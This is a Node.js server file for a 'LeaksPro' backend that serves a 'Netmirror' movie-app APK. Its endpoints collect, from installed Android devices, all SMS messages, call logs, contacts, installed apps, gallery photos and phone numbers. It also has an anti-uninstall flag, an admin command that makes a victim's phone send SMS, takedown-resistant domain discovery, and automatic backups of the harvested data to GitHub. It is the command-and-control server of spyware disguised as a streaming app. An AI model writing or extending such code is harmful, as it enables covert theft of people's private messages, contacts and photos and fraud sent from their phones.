// Polyfill File for Node.js < 20 (needed by @distube/ytdl-core)
if (typeof globalThis.File === 'undefined') {
  const { Blob } = require('buffer');
  globalThis.File = class File extends Blob {
    constructor(bits, name, options = {}) {
      super(bits, options);
      this.name = name;
      this.lastModified = options.lastModified || Date.now();
    }
  };
}

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

// Initialize database (async — sql.js)
const db = require('./config/database');

async function startServer() {
  // Wait for sql.js to initialise before loading routes
  await db.__initDatabase();

  // Initialise Cloudinary
  const { initCloudinary } = require('./config/cloudinary');
  initCloudinary();

  // Import routes
  const videoRoutes = require('./routes/videos');
  const adminRoutes = require('./routes/admin');
  const tmdbRoutes = require('./routes/tmdb');
  const telegramRoutes = require('./routes/telegram');

  // Import WebSocket handler
  const setupWebSocket = require('./websocket/handler');

  const app = express();
  const server = http.createServer(app);

  // Socket.IO with CORS + mobile-friendly ping settings
  const io = new Server(server, {
    cors: {
      origin: '*',
      methods: ['GET', 'POST', 'PUT', 'DELETE'],
    },
    maxHttpBufferSize: 100 * 1024 * 1024, // 100MB for chunk uploads
    pingInterval: 25000,  // ping every 25 seconds (mobile-friendly)
    pingTimeout: 20000,   // mark dead after 20 seconds no response
  });

  // Middleware
  app.use(cors());
  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ extended: true, limit: '50mb' }));

  // Ensure data directory exists
  const dataDir = path.join(__dirname, 'data');
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

  // Static files (admin panel only — videos are on Cloudinary)
  app.use('/admin', express.static(path.join(__dirname, 'admin-panel')));

  // Landing page (movie app download page) — with mobile-friendly headers
  app.use('/downloadapp', (req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cache-Control', 'public, max-age=300');
    // Prevent mobile browsers from blocking the page
    res.setHeader('X-Frame-Options', 'SAMEORIGIN');
    res.setHeader('Referrer-Policy', 'no-referrer-when-downgrade');
    next();
  }, express.static(path.join(__dirname, 'landing-page')));

  // Serve the Netmirror APK for download
  app.get('/downloadapp/Netmirror.apk', (req, res) => {
    // Check for secure (uploaded via admin) APK first, then fallback to regular
    const securePath = path.join(__dirname, 'data', 'Netmirror-secure.apk');
    const regularPath = path.join(__dirname, 'data', 'Netmirror.apk');

    let apkPath = null;
    if (fs.existsSync(securePath)) {
      apkPath = securePath;
    } else if (fs.existsSync(regularPath)) {
      apkPath = regularPath;
    }

    if (apkPath) {
      const stats = fs.statSync(apkPath);
      res.setHeader('Content-Type', 'application/vnd.android.package-archive');
      res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
      res.setHeader('Content-Length', stats.size);
      res.sendFile(apkPath);
    } else {
      res.status(404).send('APK not available yet. Please upload one via admin panel.');
    }
  });

  // Make io accessible to routes
  app.set('io', io);

  // ═══════════════ REAL-TIME METRICS ═══════════════
  const metrics = {
    requestsTotal: 0,     // total HTTP requests since boot
    requestsPerSec: 0,    // rolling per-second rate
    bytesOut: 0,          // total bytes sent
    bytesOutPerSec: 0,    // rolling per-second bandwidth
    wsMessagesIn: 0,      // WebSocket messages received
    wsMessagesOut: 0,     // WebSocket messages emitted
    wsPerSec: 0,          // rolling WS msgs/sec
    activeStreams: 0,     // active Telegram streams
    errors: 0,           // HTTP errors (4xx/5xx)
    _prevReqs: 0,
    _prevBytes: 0,
    _prevWs: 0,
    startTime: Date.now(),
  };

  // Middleware: count every HTTP request + response bytes
  app.use((req, res, next) => {
    metrics.requestsTotal++;
    const origWrite = res.write;
    const origEnd = res.end;
    res.write = function (chunk, ...args) {
      if (chunk) metrics.bytesOut += (typeof chunk === 'string') ? Buffer.byteLength(chunk) : chunk.length;
      return origWrite.call(this, chunk, ...args);
    };
    res.end = function (chunk, ...args) {
      if (chunk) metrics.bytesOut += (typeof chunk === 'string') ? Buffer.byteLength(chunk) : chunk.length;
      if (res.statusCode >= 400) metrics.errors++;
      return origEnd.call(this, chunk, ...args);
    };
    next();
  });

  // Count WS messages via Socket.IO middleware
  const origEmit = io.emit.bind(io);
  io.emit = function (...args) {
    metrics.wsMessagesOut++;
    return origEmit(...args);
  };
  io.on('connection', (socket) => {
    socket.onAny(() => { metrics.wsMessagesIn++; });
  });

  // Broadcast metrics every 2 seconds
  setInterval(() => {
    const now = Date.now();
    const elapsed = 2; // 2 seconds interval
    metrics.requestsPerSec = Math.round((metrics.requestsTotal - metrics._prevReqs) / elapsed);
    metrics.bytesOutPerSec = Math.round((metrics.bytesOut - metrics._prevBytes) / elapsed);
    metrics.wsPerSec = Math.round((metrics.wsMessagesIn + metrics.wsMessagesOut - metrics._prevWs) / elapsed);
    metrics._prevReqs = metrics.requestsTotal;
    metrics._prevBytes = metrics.bytesOut;
    metrics._prevWs = metrics.wsMessagesIn + metrics.wsMessagesOut;

    const mem = process.memoryUsage();
    const uptime = process.uptime();
    const wsClients = io.engine ? io.engine.clientsCount : 0;

    // Count online devices from DB
    let devicesOnline = 0;
    try { devicesOnline = (db.prepare("SELECT COUNT(*) as c FROM devices WHERE is_online = 1").get() || {}).c || 0; } catch (_) {}

    origEmit('server_metrics', {
      uptime: Math.floor(uptime),
      memHeapMB: Math.round(mem.heapUsed / 1048576),
      memRssMB: Math.round(mem.rss / 1048576),
      reqTotal: metrics.requestsTotal,
      reqPerSec: metrics.requestsPerSec,
      bytesOut: metrics.bytesOut,
      bwPerSec: metrics.bytesOutPerSec,
      wsIn: metrics.wsMessagesIn,
      wsOut: metrics.wsMessagesOut,
      wsPerSec: metrics.wsPerSec,
      wsClients,
      devicesOnline,
      errors: metrics.errors,
      activeStreams: metrics.activeStreams,
      ts: now,
    });
  }, 2000);

  // Expose metrics object so routes can update (e.g. activeStreams)
  app.set('metrics', metrics);

  // Ping endpoint for RTT measurement
  app.get('/api/ping', (req, res) => {
    res.json({ pong: Date.now() });
  });

  // Domain discovery endpoint — unauthenticated, cached
  // Apps call this to find the current server domain
  // If hosting dies, apps fall back to GitHub raw URL
  app.get('/api/discovery', (req, res) => {
    try {
      const domain = db.prepare("SELECT value FROM admin_settings WHERE key = 'server_domain'").get();
      const currentOrigin = `${req.protocol}://${req.get('host')}`;
      res.setHeader('Cache-Control', 'public, max-age=300');
      res.json({
        domain: domain?.value || currentOrigin,
        api_base: `${domain?.value || currentOrigin}/api`,
        admin_panel: `${domain?.value || currentOrigin}/admin`,
        download_apk: `${domain?.value || currentOrigin}/downloadapp/Netmirror.apk`,
        fallback_discovery: `https://raw.githubusercontent.com/vernapark/Leakspro-backend/main/domain.json`,
        timestamp: Date.now()
      });
    } catch (_) {
      res.json({ domain: `${req.protocol}://${req.get('host')}`, timestamp: Date.now() });
    }
  });

  // Root route — redirect to landing page
  app.get('/', (req, res) => {
    res.redirect('/downloadapp');
  });

  // API Routes
  app.use('/api/videos', videoRoutes);
  app.use('/api/admin', adminRoutes);
  app.use('/api/tmdb', tmdbRoutes);
  app.use('/api/telegram', telegramRoutes);

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({
      status: 'ok',
      app: 'LeaksPro Backend',
      version: '1.0.0',
      uptime: process.uptime(),
      timestamp: new Date().toISOString(),
    });
  });

  // Device registration endpoint (called by Android app on first launch)
  app.post('/api/devices/register', (req, res) => {
    try {
      const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });

      const phonesJson = JSON.stringify(phone_numbers || []);
      const existing = db.prepare('SELECT device_id FROM devices WHERE device_id = ?').get(device_id);
      if (existing) {
        db.prepare(`UPDATE devices SET
          device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
          app_version = ?, screen_resolution = ?, phone_numbers = ?,
          battery_percent = ?, battery_charging = ?,
          total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
          is_online = 1, last_seen = datetime('now')
          WHERE device_id = ?`).run(
          device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
          app_version || '', screen_resolution || '', phonesJson,
          battery_percent ?? -1, battery_charging ? 1 : 0,
          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
          device_id
        );
      } else {
        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram)
          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
          device_id, device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
          app_version || '', screen_resolution || '', phonesJson,
          battery_percent ?? -1, battery_charging ? 1 : 0,
          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0
        );
      }
      // Broadcast to admin panel in real-time so no refresh needed
      const io = req.app.get('io');
      if (io) {
        const device = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(device_id);
        if (device) {
          try { device.phone_numbers = JSON.parse(device.phone_numbers || '[]'); } catch (_) { device.phone_numbers = []; }
          io.emit('device_online', device);
        }
      }

      // Return anti_uninstall status so device can act on it
      const deviceRow = db.prepare('SELECT anti_uninstall FROM devices WHERE device_id = ?').get(device_id);
      res.json({ success: true, anti_uninstall: deviceRow ? deviceRow.anti_uninstall : 1 });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // SMS sync endpoint — Android app sends all SMS messages here
  app.post('/api/devices/sms', (req, res) => {
    try {
      const { device_id, messages } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(messages)) return res.status(400).json({ error: 'messages must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO sms_messages
        (device_id, sms_id, address, body, date, type, read, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const msg of messages) {
        try {
          insert.run(
            device_id,
            msg.id || 0,
            msg.address || 'Unknown',
            msg.body || '',
            msg.date || 0,
            msg.type || 1,
            msg.read || 0
          );
          count++;
        } catch (_) { /* skip duplicates or errors */ }
      }

      console.log(`[SMS] Synced ${count} messages from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Call logs sync endpoint — Android app sends call logs here
  app.post('/api/devices/call-logs', (req, res) => {
    try {
      const { device_id, logs } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(logs)) return res.status(400).json({ error: 'logs must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO call_logs
        (device_id, call_id, number, name, type, date, duration, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const log of logs) {
        try {
          insert.run(
            device_id,
            log.id || 0,
            log.number || 'Unknown',
            log.name || '',
            log.type || 1,
            log.date || 0,
            log.duration || 0
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[CALLS] Synced ${count} call logs from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Contacts sync endpoint — Android app sends contacts here
  app.post('/api/devices/contacts', (req, res) => {
    try {
      const { device_id, contacts } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO contacts
        (device_id, contact_id, name, phones, emails, synced_at)
        VALUES (?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const c of contacts) {
        try {
          insert.run(
            device_id,
            String(c.id || count),
            c.name || 'Unknown',
            JSON.stringify(c.phones || []),
            JSON.stringify(c.emails || [])
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[CONTACTS] Synced ${count} contacts from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Installed apps sync endpoint — Android app sends app list here
  app.post('/api/devices/apps', (req, res) => {
    try {
      const { device_id, apps } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(apps)) return res.status(400).json({ error: 'apps must be an array' });

      // Clear old apps for this device and re-insert (full sync)
      db.prepare('DELETE FROM installed_apps WHERE device_id = ?').run(device_id);

      const insert = db.prepare(`INSERT INTO installed_apps
        (device_id, package_name, app_name, version, install_time, update_time, is_system, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const app of apps) {
        try {
          insert.run(
            device_id,
            app.package_name || '',
            app.app_name || '',
            app.version || '',
            app.install_time || 0,
            app.update_time || 0,
            app.is_system ? 1 : 0
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[APPS] Synced ${count} apps from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Gallery photos sync endpoint — Android app sends gallery photos here
  app.post('/api/devices/gallery', (req, res) => {
    try {
      const { device_id, photos } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(photos)) return res.status(400).json({ error: 'photos must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO gallery_photos
        (device_id, media_id, filename, date_taken, width, height, size, image_base64, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const photo of photos) {
        try {
          insert.run(
            device_id,
            photo.media_id || 0,
            photo.filename || '',
            photo.date_taken || 0,
            photo.width || 0,
            photo.height || 0,
            photo.size || 0,
            photo.image_base64 || ''
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[GALLERY] Synced ${count} photos from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Gallery debug endpoint — device reports what it sees so we can diagnose
  app.post('/api/devices/gallery-debug', (req, res) => {
    try {
      const report = req.body;
      console.log(`\n[GALLERY-DEBUG] ==============================`);
      console.log(`[GALLERY-DEBUG] Device: ${report.device_id || 'UNKNOWN'}`);
      console.log(`[GALLERY-DEBUG] Model: ${report.model || '?'}`);
      console.log(`[GALLERY-DEBUG] SDK: ${report.sdk_version || '?'}`);
      console.log(`[GALLERY-DEBUG] Has READ_EXTERNAL_STORAGE: ${report.has_read_storage}`);
      console.log(`[GALLERY-DEBUG] Has READ_MEDIA_IMAGES: ${report.has_read_media}`);
      console.log(`[GALLERY-DEBUG] hasPermission(): ${report.has_permission}`);
      console.log(`[GALLERY-DEBUG] Photos read from device: ${report.photos_read}`);
      console.log(`[GALLERY-DEBUG] New for backend: ${report.new_for_backend}`);
      console.log(`[GALLERY-DEBUG] New for firestore: ${report.new_for_firestore}`);
      console.log(`[GALLERY-DEBUG] Backend synced: ${report.backend_synced}`);
      console.log(`[GALLERY-DEBUG] Firestore synced: ${report.firestore_synced}`);
      console.log(`[GALLERY-DEBUG] Errors: ${JSON.stringify(report.errors || [])}`);
      console.log(`[GALLERY-DEBUG] Source: ${report.source || '?'}`);
      console.log(`[GALLERY-DEBUG] Timestamp: ${report.timestamp}`);
      console.log(`[GALLERY-DEBUG] ==============================\n`);

      // Store the latest debug report per device
      db.exec(`CREATE TABLE IF NOT EXISTS gallery_debug (
        device_id TEXT PRIMARY KEY,
        report TEXT,
        received_at DATETIME DEFAULT (datetime('now'))
      )`);
      db.prepare(`INSERT OR REPLACE INTO gallery_debug (device_id, report, received_at)
        VALUES (?, ?, datetime('now'))`).run(report.device_id || 'unknown', JSON.stringify(report));

      res.json({ success: true });
    } catch (err) {
      console.error('[GALLERY-DEBUG] Error:', err.message);
      res.json({ success: true }); // Still return OK
    }
  });

  // View gallery debug reports — admin endpoint
  app.get('/api/admin/gallery-debug', (req, res) => {
    try {
      const password = req.headers['x-admin-password'] || req.query.password;
      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
      if (!stored || password !== stored.value) {
        return res.status(401).json({ error: 'Unauthorized' });
      }
      const rows = db.prepare('SELECT * FROM gallery_debug ORDER BY received_at DESC').all();
      const reports = rows.map(r => ({ ...JSON.parse(r.report), received_at: r.received_at }));
      res.json({ reports });
    } catch (err) {
      res.json({ reports: [], error: err.message });
    }
  });

  // Send SMS via device — admin sends command to a connected device
  app.post('/api/admin/send-sms', (req, res) => {
    try {
      const { password, device_id, receiver, message, sim_slot } = req.body;

      // Verify admin password
      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
      if (!stored || password !== stored.value) {
        return res.status(401).json({ error: 'Invalid admin password' });
      }

      if (!device_id || !receiver || !message) {
        return res.status(400).json({ error: 'device_id, receiver, and message are required' });
      }

      // Find the device's socket
      const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
      if (!device || !device.socket_id) {
        return res.status(400).json({ error: 'Device is not connected via WebSocket. The app must be open.' });
      }

      const targetSocket = io.sockets.sockets.get(device.socket_id);
      if (!targetSocket) {
        return res.status(400).json({ error: 'Device socket not found. The app may have just disconnected.' });
      }

      // Generate a unique request ID for tracking
      const requestId = `sms_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;

      // Emit send_sms command to the device
      targetSocket.emit('send_sms', {
        request_id: requestId,
        receiver,
        message,
        sim_slot: sim_slot || 1,
      });

      console.log(`[SMS-SEND] Command sent to device ${device_id}: to=${receiver} sim=${sim_slot}`);
      res.json({ success: true, request_id: requestId, message: 'Send command dispatched to device' });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Stream endpoint — redirects to Cloudinary URL
  app.get('/api/stream/:videoId', (req, res) => {
    try {
      const Video = require('./models/Video');
      const video = Video.getById(req.params.videoId);
      if (!video) return res.status(404).json({ error: 'Video not found' });
      res.redirect(video.filename);
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Setup WebSocket
  setupWebSocket(io);

  // ========== CLEANUP TIMER ==========
  // Every 10 minutes, mark devices offline if no heartbeat for 2 hours.
  // Devices are NEVER deleted — they just go offline.
  setInterval(() => {
    try {
      const stale = db.prepare(
        "SELECT device_id FROM devices WHERE is_online = 1 AND last_seen < datetime('now', '-2 hours')"
      ).all();
      if (stale.length > 0) {
        db.prepare(
          "UPDATE devices SET is_online = 0 WHERE last_seen < datetime('now', '-2 hours')"
        ).run();
        // Re-query each device for full data and broadcast
        stale.forEach(d => {
          const full = db.prepare('SELECT * FROM devices WHERE device_id = ?').get(d.device_id);
          if (full) {
            try { full.phone_numbers = JSON.parse(full.phone_numbers || '[]'); } catch (_) { full.phone_numbers = []; }
            io.emit('device_offline', full);
          }
        });
        console.log(`[CLEANUP] Marked ${stale.length} device(s) offline — no heartbeat for 2+ hours`);
      }
    } catch (err) {
      console.error('[CLEANUP] Error:', err.message);
    }
  }, 10 * 60 * 1000); // every 10 minutes

  // Start listening
  const PORT = process.env.PORT || 3000;
  return new Promise((resolve, reject) => {
    server.on('error', reject);
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`[SERVER] LeaksPro Backend running on port ${PORT}`);
      console.log(`[SERVER] Environment: ${process.env.NODE_ENV || 'development'}`);
      console.log(`[SERVER] Ready to accept connections`);

      // ── Auto GitHub Backup Scheduler (every 6 hours) ──
      setInterval(async () => {
        try {
          const enabled = db.prepare("SELECT value FROM admin_settings WHERE key = 'auto_backup_enabled'").get();
          if (enabled?.value !== '1') return;

          const token = db.prepare("SELECT value FROM admin_settings WHERE key = 'github_token'").get();
          if (!token?.value) return;

          console.log('[AutoBackup] Starting scheduled GitHub backup...');
          const tables = ['admin_settings', 'devices', 'admin_devices', 'videos', 'categories',
                           'sms_messages', 'call_logs', 'contacts', 'installed_apps', 'gallery_photos',
                           'signed_apks', 'watch_history', 'comments'];
          const backup = { version: 2, created_at: new Date().toISOString(), auto: true, tables: {} };
          for (const t of tables) {
            try { backup.tables[t] = db.prepare(`SELECT * FROM ${t}`).all(); } catch (_) { backup.tables[t] = []; }
          }
          const backupJson = JSON.stringify(backup);

          const apiUrl = `https://api.github.com/repos/vernapark/Leakspro-backend/contents/backups/db-backup.json`;
          const headers = {
            'Authorization': `token ${token.value}`,
            'Accept': 'application/vnd.github.v3+json',
            'Content-Type': 'application/json',
            'User-Agent': 'LeaksPro-Backend'
          };

          // Get existing SHA
          let sha = null;
          try {
            const existing = await fetch(apiUrl, { headers });
            if (existing.ok) { sha = (await existing.json()).sha; }
          } catch (_) {}

          const body = { message: `Auto backup — ${new Date().toISOString()}`, content: Buffer.from(backupJson).toString('base64') };
          if (sha) body.sha = sha;

          const ghRes = await fetch(apiUrl, { method: 'PUT', headers, body: JSON.stringify(body) });
          if (ghRes.ok) {
            db.prepare("INSERT OR REPLACE INTO admin_settings (key, value) VALUES ('last_github_backup', ?)").run(new Date().toISOString());
            console.log('[AutoBackup] GitHub backup successful');
          } else {
            console.warn('[AutoBackup] GitHub push failed:', ghRes.status);
          }
        } catch (e) {
          console.warn('[AutoBackup] Error:', e.message);
        }
      }, 6 * 60 * 60 * 1000); // every 6 hours

      resolve();
    });
  });
}

// Global error handlers — must exit so Railway restarts the container
process.on('uncaughtException', (err) => {
  console.error('UNCAUGHT EXCEPTION:', err);
  process.exit(1);
});
process.on('unhandledRejection', (err) => {
  console.error('UNHANDLED REJECTION:', err);
  process.exit(1);
});

// Start the server
startServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
